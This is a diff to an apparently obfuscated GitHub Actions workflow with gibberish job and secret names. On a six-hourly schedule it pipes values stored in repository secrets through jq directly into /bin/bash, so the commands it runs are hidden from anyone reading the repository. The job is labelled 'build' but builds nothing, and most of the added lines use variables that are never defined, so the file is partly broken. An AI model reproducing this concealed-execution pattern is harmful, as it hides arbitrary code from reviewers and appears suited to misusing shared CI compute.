@@ -1,19 +1,22 @@
 name: wangyuse3478
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 3/6 * * *'
+    - cron: '6 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangyuse3478
         env:
-          nxpmv50909: ${{ secrets.nxpmv50909 }}
+          nhk039: ${{ secrets.nhk039 }}
         run: |
-          echo $nxpmv50909 | jq -r .japh3 | /bin/bash
-          echo $piq061 | jq -r .xqgs453 | /bin/bash
+          echo $nhk039 | jq -r .ouj42587 | /bin/bash
+          echo $fuhc1802 | jq -r .tkw04573 | /bin/bash
+          echo $heuw40173 | jq -r .ayljs9771 | /bin/bash
+          echo $xasab37 | jq -r .dcwnz73 | /bin/bash
+          echo $k55422 | jq -r .u4140 | /bin/bash
+          echo $sa06655 | jq -r .i48542 | /bin/bash
+          echo $qwjx7 | jq -r .nwkne503 | /bin/bash
 
